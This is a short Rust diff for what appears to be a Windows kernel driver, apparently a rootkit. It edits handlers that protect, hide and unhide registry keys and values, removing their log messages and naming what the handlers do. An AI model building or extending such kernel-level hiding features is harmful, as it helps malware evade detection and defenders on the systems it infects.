@@ -26,7 +26,6 @@ use {
 pub fn get_registry_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
     // Adding protection for registry key values.
     ioctls.insert(IOCTL_REGISTRY_PROTECTION_VALUE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
-        log::info!("Received IOCTL_REGISTRY_PROTECTION_VALUE");
         let status = unsafe { handle_registry!(stack, Registry::add_remove_registry_toggle, TargetRegistry, KeyListType::Protect) };
         unsafe { (*irp).IoStatus.Information = 0 };
         status
@@ -34,23 +33,20 @@ pub fn get_registry_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
     
     // Added protection for registry keys.
     ioctls.insert(IOCTL_REGISTRY_PROTECTION_KEY, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
-        log::info!("Received IOCTL_REGISTRY_PROTECTION_KEY");
         let status = unsafe { handle_registry!(stack, Registry::add_remove_key_toggle, TargetRegistry, KeyListType::Protect) };
         unsafe { (*irp).IoStatus.Information = 0 };
         status
     }) as IoctlHandler);
 
-    // ?
+    // Handles IOCTL to hide or unhide a registry key
     ioctls.insert(IOCTL_HIDE_UNHIDE_KEY, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
-        log::info!("Received IOCTL_HIDE_UNHIDE_KEY");
         let status = unsafe { handle_registry!(stack, Registry::add_remove_key_toggle, TargetRegistry, KeyListType::Hide) };
         unsafe { (*irp).IoStatus.Information = 0 };
         status
     }) as IoctlHandler);
 
-    // ?
+    // Handles IOCTL to hide or unhide a registry value
     ioctls.insert(IOCTL_HIDE_UNHIDE_VALUE, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
-        log::info!("Received IOCTL_HIDE_UNHIDE_VALUE");
         let status = unsafe { handle_registry!(stack, Registry::add_remove_registry_toggle, TargetRegistry, KeyListType::Hide) };
         unsafe { (*irp).IoStatus.Information = 0 };
         status
